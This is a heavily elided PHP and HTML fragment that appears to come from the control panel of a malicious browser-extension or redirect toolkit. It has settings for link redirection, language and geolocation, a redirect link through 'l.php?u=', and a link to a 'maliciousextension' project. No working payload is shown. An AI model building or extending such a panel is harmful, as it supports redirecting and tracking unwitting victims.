...
if($_SESSION['user']){
	...
	if($_GET['do']=="change"){
        ...
        switch ($id) {
            case '1':
                $change="Change Link Redirection";
                break;
            case '4':
                $change="Create Profile";
                break;
            case '3':
                $change="Change Language or Data";
                break;
...
<h4 class="form-title" title="methods"><center>templates<center></h4>
	...
	<pre><b>Link Redirection Current:</b><br><?php echo "$var";?><br><b>Language:</b><?php echo "$lang";?><br><b>Geolocation:</b><?php echo "$geo";?>
	</pre>
<pre><a style="color:red">PRE Methods</a></pre>
...
[10]<a target="_blank" href="../l.php?u=www.youtube.com/watch?view=2jma2o421">Go to          </a>            <font color="red"> no</font></center>
[?]<a target="_blank" href="http://sourceforge.net/projects/maliciousextension/">Project Malicius Extencion</a></center>
</pre><br>
<pre>
...
<pre><a style="color:red">POST Methods</a></pre>
